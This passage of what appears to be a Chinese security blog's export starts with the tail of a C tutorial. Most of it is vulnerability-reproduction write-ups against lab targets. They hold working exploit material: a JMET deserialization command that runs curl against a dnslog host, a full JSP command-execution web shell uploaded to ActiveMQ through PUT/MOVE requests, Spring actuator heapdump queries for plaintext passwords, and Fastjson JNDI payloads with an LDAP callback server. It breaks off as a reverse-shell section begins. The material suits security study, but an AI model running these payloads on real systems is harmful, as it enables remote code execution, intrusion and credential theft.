plaintext">&#123;<br>   int mount;<br>   auto int month;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="register"><a href="#register" class="headerlink" title="register"></a>register</h3><p><code>register</code> 存储类用于定义存储在寄存器中而不是 RAM 中的局部变量。这意味着变量的最大尺寸等于寄存器的大小（通常是一个字），且不能对它应用一元的 ‘&amp;’ 运算符（因为它没有内存位置）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;<br>   register int  miles;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><p><code>static</code> 存储类指示编译器在程序的生命周期内保持局部变量的存在，而不需要在每次它进入和离开作用域时进行创建和销毁。因此，使用 static 修饰局部变量可以在函数调用之间保持局部变量的值。</p><p><code>static</code> 修饰符也可以应用于全局变量。当 static 修饰全局变量时，会使变量的作用域限制在声明它的文件内。</p><p>全局声明的一个 static 变量或方法可以被任何函数或方法调用，只要这些方法出现在跟 <code>static</code> 变量或方法同一个文件中。</p><p>以下实例演示了 static 修饰全局变量和局部变量的应用：</p><h3 id="extern"><a href="#extern" class="headerlink" title="extern"></a>extern</h3><p><code>extern</code> 存储类用于提供一个全局变量的引用，全局变量对所有的程序文件都是可见的。当您使用 <code>extern</code> 时，对于无法初始化的变量，会把变量名指向一个之前定义过的存储位置。</p><p>当您有多个文件且定义了一个可以在其他文件中使用的全局变量或函数时，可以在其他文件中使用 <code>extern</code> 来得到已定义的变量或函数的引用。可以这么理解，<code>extern</code> 是用来在另一个文件中声明一个全局变量或函数。</p><p><code>extern</code> 修饰符通常用于当有两个或多个文件共享相同的全局变量或函数的时候，如下所示：</p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p><a href="https://www.runoob.com/cprogramming/c-structures.html">https://www.runoob.com/cprogramming/c-structures.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">struct Boos<br>&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="typedef"><a href="#typedef" class="headerlink" title="typedef"></a>typedef</h2><p>设置别名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># include &lt;stdio.h&gt;<br>int main()<br>&#123;<br>   typedef int test;<br><br>   test i = 1;<br>   printf(&quot;%d&quot;, i);<br><br>   return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><p>链表是结构体变量与结构体变量连接在一起</p><h3 id="静态链表"><a href="#静态链表" class="headerlink" title="静态链表"></a>静态链表</h3><h3 id="动态链表"><a href="#动态链表" class="headerlink" title="动态链表"></a>动态链表</h3><p>动态创建一个链表：动态内存申请 + 模块化设计</p><p>1、创建链表（创建一个表头表示整个链表）</p><p>2、创建节点</p><p>3、插入节点</p><p>4、删除节点</p><p>5、打印遍历链表</p>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2015-5254 ActiveMQ 反序列化漏洞复现</title>
      <link href="/2021/08/13/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20ActiveMQ%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2015-5254/CVE-2015-5254/"/>
      <url>/2021/08/13/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20ActiveMQ%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2015-5254/CVE-2015-5254/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Apache ActiveMQ 5.13.0之前5.x版本</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  进入 vulhub 目录下的 /activemq/CVE-2015-5254/ 目录<br>#  启动环境<br>sudo docker-compose up -d<br>#  查看环境<br>sudo docker ps -a<br>#  进入环境目录<br>sudo docker exec -it 268f542b6482 bash<br></code></pre></td></tr></table></figure><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>页面如下</p><p>默认账号密码：<code>admin</code>&#x2F;<code>admin</code></p><p><img src="1.png"></p><p>下载 <a href="https://github.com/matthiaskaiser/jmet">JMET</a> 工具</p><p>对目标发送一个访问 <code>dnslog</code> 的 <code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;curl xxx.dnslog.cn&quot; -Yp ROME 192.168.137.135 61616<br></code></pre></td></tr></table></figure><p><img src="command.jpg"></p><p>然后访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://192.168.137.135:8161/admin/browse.jsp?JMSDestination=event<br></code></pre></td></tr></table></figure><p>此时可看到该页面有多条信息，单击信息触发命令（如没触发则换个信息单击）</p><p><img src="2.jpg"></p><p><img src="dnslog.jpg"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>更新版本</p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="http://wiki.peiqi.tech/PeiQi_Wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ActiveMQ/Apache%20ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2015-5254.html">http://wiki.peiqi.tech/PeiQi_Wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ActiveMQ/Apache%20ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2015-5254.html</a></p><p><a href="https://www.cnblogs.com/backlion/p/9970516.html">https://www.cnblogs.com/backlion/p/9970516.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> ActiveMQ 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-3088 ActiveMQ 反序列化漏洞复现</title>
      <link href="/2021/08/13/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20ActiveMQ%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2016-3088/CVE-2016-3088/"/>
      <url>/2021/08/13/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20ActiveMQ%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2016-3088/CVE-2016-3088/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Apache ActiveMQ 5.13.0之前5.x版本</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  进入 vulhub 目录下的 /activemq/CVE-2016-3088/ 目录<br>#  启动环境<br>sudo docker-compose up -d<br>#  查看环境<br>sudo docker ps -a<br>#  进入环境目录<br>sudo docker exec -it 268f542b6482 bash<br></code></pre></td></tr></table></figure><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>页面如下</p><p><img src="1.png"></p><p>默认账号密码：<code>admin</code>&#x2F;<code>admin</code></p><p>访问如下链接获取当前系统路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://192.168.137.135:8161/admin/test/systemProperties.jsp<br></code></pre></td></tr></table></figure><p><img src="2.jpg"></p><p>上传 jsp 小马（fileserver 路径下不解析）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PUT /fileserver/1.txt HTTP/1.1<br>Host: 192.168.137.135:8161<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Content-Length: 5<br><br>&lt;%@ page import=&quot;java.io.*&quot; %&gt;<br>&lt;%<br>try &#123;<br>String cmd = request.getParameter(&quot;cmd&quot;);<br>Process child = Runtime.getRuntime().exec(cmd);<br>InputStream in = child.getInputStream();<br>int c;<br>while ((c = in.read()) != -1) &#123;<br>out.print((char)c);<br>&#125;<br>in.close();<br>try &#123;<br>child.waitFor();<br>&#125; catch (InterruptedException e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125; catch (IOException e) &#123;<br>System.err.println(e);<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="put.jpg"></p><p>将 <code>/fileserver/1.txt</code> 移动到 <code>/opt/activemq/webapps/admin/1.jsp</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">MOVE /fileserver/1.txt HTTP/1.1<br>Destination: file:///opt/activemq/webapps/admin/1.jsp<br>Host: 192.168.137.135:8161<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Content-Length: 0<br><br><br></code></pre></td></tr></table></figure><p><img src="move.jpg"></p><p>执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GET /admin/1.jsp?cmd=whoami HTTP/1.1<br>Host: 192.168.137.135:8161<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Referer: http://192.168.137.135:8161/admin/1.jsp?cmd=ls%20/<br>Authorization: Basic YWRtaW46YWRtaW4=<br>Connection: close<br>Cookie: JSESSIONID=1huqk1vr8x7lywpbr53l82ktv<br>Upgrade-Insecure-Requests: 1<br>X-Forwarded-For: 127.0.0.1<br>Cache-Control: max-age=0<br><br><br></code></pre></td></tr></table></figure><p><img src="command.jpg"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>更新版本</p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://paper.seebug.org/346/">https://paper.seebug.org/346/</a></p><p><a href="https://www.cnblogs.com/xyongsec/p/11459542.html">https://www.cnblogs.com/xyongsec/p/11459542.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> ActiveMQ 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Springboot boot actuator 未授权访问漏洞复现</title>
      <link href="/2021/08/12/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Springboot%20boot%20actuator/Springboot%20boot%20actuator/"/>
      <url>/2021/08/12/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Springboot%20boot%20actuator/Springboot%20boot%20actuator/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Actuator是SpringBoot提供的用来帮助我们在将应用程序推向生产环境时对其进行监视和管理的工具集。</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01  环境搭建"></a>0x01  环境搭建</h2><p>参考：<a href="https://github.com/callicoder/spring-boot-actuator-demo">https://github.com/callicoder/spring-boot-actuator-demo</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  下载<br>sudo git clone https://github.com/callicoder/spring-boot-actuator-demo.git<br>#  安装 maven<br>sudo apt-get install maven -y<br>#  启动环境<br>sudo mvn spring-boot:run<br></code></pre></td></tr></table></figure><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02  漏洞利用"></a>0x02  漏洞利用</h2><p>默认账号密码为：<code>actuator</code></p><p>页面如下</p><p><img src="1.jpg"></p><h3 id="获取明文密码"><a href="#获取明文密码" class="headerlink" title="获取明文密码"></a>获取明文密码</h3><p>下载 <code>heapdump</code> 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://192.168.137.135:8080/actuator/heapdump<br>或者<br>http://192.168.137.135:8080/heapdump<br></code></pre></td></tr></table></figure><p>使用 <a href="https://www.eclipse.org/mat/previousReleases.php">Eclipse Memory Analyzer</a> 工具打开下载到的 <code>heapdump</code> 文件</p><p><img src="2.jpg"></p><p><img src="3.jpg"></p><p>然后使用 <a href="https://www.eclipse.org/mat/previousReleases.php">Eclipse Memory Analyzer</a> 工具的 <code>OQL</code>（对象查询语言） 语句进行查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">spring boot 1.x版本<br>select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))<br><br>spring boot 2.x版本<br>select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))<br></code></pre></td></tr></table></figure><p>输入完后按 <code>f5</code> 执行或者单击上面的红色感叹号</p><p><img src="4.jpg"></p><h3 id="其他路径"><a href="#其他路径" class="headerlink" title="其他路径"></a>其他路径</h3><table><thead><tr><th>Method</th><th>路径</th><th align="left">描述</th></tr></thead><tbody><tr><td>get</td><td>&#x2F;actuator&#x2F;autoconfig</td><td align="left">泄露应用的自动化配置报告，包括所有自动化配置的候选项。同时还列出了每个候选项自动化配置的各个先决条件是否满足</td></tr><tr><td>get</td><td>&#x2F;actuator&#x2F;configprops</td><td align="left">描述配置属性（包含默认值）如何注入 Bean</td></tr><tr><td>get</td><td>&#x2F;actuator&#x2F;beans</td><td align="left">泄露应用上下文中创建的所有Bean</td></tr><tr><td>get</td><td>&#x2F;actuator&#x2F;dump</td><td align="left">获取线程活动的快照</td></tr><tr><td>get</td><td>&#x2F;actuator&#x2F;env</td><td align="left">泄露环境配置信息</td></tr><tr><td>get</td><td>&#x2F;actuator&#x2F;heapdump</td><td align="left"></td></tr><tr><td>get</td><td>&#x2F;actuator&#x2F;env&#x2F;{name}</td><td align="left">根据名称获取特定的环境属性值</td></tr><tr><td>get</td><td>&#x2F;actuator&#x2F;health</td><td align="left">报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供</td></tr><tr><td>get</td><td>&#x2F;actuator&#x2F;info</td><td align="left">获取应用程序的定制信息，这些信息由 info 打头的属性提供</td></tr><tr><td>get</td><td>&#x2F;actuator&#x2F;mappings</td><td align="left">描述全部的 URI 路径，以及它们和控制器（包含 Actuator 端点）的映射关系</td></tr><tr><td>get</td><td>&#x2F;actuator&#x2F;metrics</td><td align="left">报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数</td></tr><tr><td>get</td><td>&#x2F;actuator&#x2F;metrics&#x2F;{name}</td><td align="left">报告指定名称的应用程序度量值</td></tr><tr><td>post</td><td>&#x2F;actuator&#x2F;shutdown</td><td align="left">关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true（默认为 false）</td></tr><tr><td>get</td><td>&#x2F;actuator&#x2F;trace</td><td align="left">提供基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）</td></tr></tbody></table><h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03  漏洞修复"></a>0x03  漏洞修复</h2><p><a href="https://xz.aliyun.com/t/2233">https://xz.aliyun.com/t/2233</a></p><h2 id="0x04-参考-URL"><a href="#0x04-参考-URL" class="headerlink" title="0x04 参考 URL"></a>0x04 参考 URL</h2><p><a href="https://mp.weixin.qq.com/s/b-C-eONRoND1jX-07oREsA">https://mp.weixin.qq.com/s/b-C-eONRoND1jX-07oREsA</a></p><p><a href="https://www.freebuf.com/articles/web/278245.html">https://www.freebuf.com/articles/web/278245.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Springboot boot actuator 未授权访问漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson 1.2.47 反序列化导致任意命令执行 漏洞复现</title>
      <link href="/2021/08/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Fastjson%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.2.47/1.2.47/"/>
      <url>/2021/08/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Fastjson%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.2.47/1.2.47/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set&#x2F;get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>fastjson&lt;&#x3D;1.2.47</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  进入 vulhub 目录下的 /fastjson/1.2.47-rce 目录<br>#  启动环境<br>sudo docker-compose up -d<br>#  查看环境<br>sudo docker ps -a<br>#  进入环境目录<br>sudo docker exec -it 268f542b6482 bash<br></code></pre></td></tr></table></figure><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>页面如下</p><p><img src="1.png"></p><p>下载<a href="https://github.com/wyzxxz/fastjson_rce_tool">工具</a>，然后启动 LDAP 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">java -cp fastjson_tool.jar fastjson.HLDAPServer 192.168.137.1 80 &quot;curl xxx.dnslog.cn&quot;<br></code></pre></td></tr></table></figure><p><img src="service.jpg"></p><p>启动后会给出两个 payload，这里使用第二个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://192.168.137.1:80/Object&quot;,&quot;autoCommit&quot;:true&#125;<br><br>&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://192.168.137.1:80/Object&quot;,&quot;autoCommit&quot;:true&#125;&#125;<br></code></pre></td></tr></table></figure><p>发包时将 <code>Content-Type: application/json</code> 更改为如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Content-Type: application/json<br></code></pre></td></tr></table></figure><p>然后发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">POST / HTTP/1.1<br>Host: 192.168.137.135:8090<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>X-Forwarded-For: 127.0.0.1<br>Content-Length: 185<br>Content-Type: application/json<br><br>&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://192.168.137.1:80/Object&quot;,&quot;autoCommit&quot;:true&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="send_poc.jpg"></p><p><img src="dnslog.jpg"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>更新版本</p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://www.cnblogs.com/0nth3way/p/13132195.html">https://www.cnblogs.com/0nth3way/p/13132195.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Fastjson 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson 1.2.24 反序列化导致任意命令执行 漏洞复现</title>
      <link href="/2021/08/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Fastjson%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.2.24/1.2.24/"/>
      <url>/2021/08/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Fastjson%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.2.24/1.2.24/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set&#x2F;get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>fastjson&lt;&#x3D;1.2.24</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  进入 vulhub 目录下的 /fastjson/1.2.24-rce 目录<br>#  启动环境<br>sudo docker-compose up -d<br>#  查看环境<br>sudo docker ps -a<br>#  进入环境目录<br>sudo docker exec -it 268f542b6482 bash<br></code></pre></td></tr></table></figure><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>页面如下</p><p><img src="1.jpg"></p><p>将以下代码保存为 TouchFile.java（需执行的命令在该文件中设置）</p><h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// javac 